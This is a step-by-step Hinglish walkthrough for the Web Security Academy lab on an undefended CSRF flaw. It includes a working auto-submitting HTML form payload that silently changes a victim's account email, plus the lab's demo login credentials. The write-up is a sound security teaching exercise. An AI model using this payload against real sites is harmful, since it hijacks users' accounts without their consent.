# CSRF vulnerability with no defenses

### ✅ Lab Objective:
Victim ka email bina uski marzi ke change karna using CSRF — kyunki koi defense nahi laga.

### 🧠 Pehle samajh le:
- Lab mein attacker (tum) ek malicious HTML page banayega.
- Jab victim wo page kholta hai, uska email silently change ho jata hai.
- Ye sab possible hai kyunki na CSRF token hai, na SameSite cookies.

---

### ⚙️ Required Tools:
- Burp Suite (Community bhi chalega)
- Lab browser
- Exploit Server (lab ke saath hota hai)

---

### 🔹 Step 1: Lab open karo & login karo
Lab open karo: CSRF vulnerability with no defenses

Burp’s browser use karo (ya Firefox with Burp)

##### Login karo:
- Username: wiener  
- Password: peter

---
 
### 🔹 Step 2: “Change email” form ko use karo
Top menu se “My account” par jao

Wahan email field dikh rahi hogi — usme koi bhi new email daal ke submit karo
Example: test@csrf.com

---

### 🔹 Step 3: Burp Suite mein request capture karo
Burp > Proxy > HTTP history mein jao

Us POST request ko dhoondo jo /my-account/change-email pe ja rahi ho

Us request ko select karo

Example:

```
POST /my-account/change-email HTTP/1.1  
Host: 0a3900ff041c9f4f81da2d1300a600f0.web-security-academy.net  
Cookie: session=...  
Content-Type: application/x-www-form-urlencoded
```
```email=test@csrf.com```

✅ Note: Ismein koi CSRF token nahi hona chahiye.

### 🔹 Step 4: URL copy karo
Right-click karo us request pe → Copy URL
Tumhe milega:

```https://0a3900ff041c9f4f81da2d1300a600f0.web-security-academy.net/my-account/change-email```

📌 Yeh URL tumhe form ke action mein lagana hai.

---

### 🔹 Step 5: Exploit HTML banao
Ab exploit server open karo:

Lab page pe “Go to exploit server” button dabao

Wahan body section mein yeh HTML paste karo: 👇

```
<form method="POST" action="https://0a3900ff041c9f4f81da2d1300a600f0.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="victim@csrf123.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

⚠️ Make sure:

action="..." mein tumhara exact lab URL ho

email koi bhi naya unique value ho (wiener@... se different)

---

### 🔹 Step 6: Exploit HTML store karo
"Store" button dabao taake payload save ho jaye

Tumhara malicious page ab ready hai

---

### 🔹 Step 7: Exploit Deliver karo
💥 Ab “Deliver to victim” button dabao

❗Yahi woh step hai jo lab ko solve karta hai — yeh victim ko tumhara page open karwata hai.

**✅ Congratulations, you solved the lab!**

---

### 🧠 Pro Penetration Testing Tip:
Real life mein agar CSRF token nahi hote:

User ke account ka password, email, setting silently change ho sakti hain

Attacker fake bank transfer bhi kar sakta hai (agar form simple ho)

Isliye ALWAYS check for CSRF token & SameSite cookies during testing.

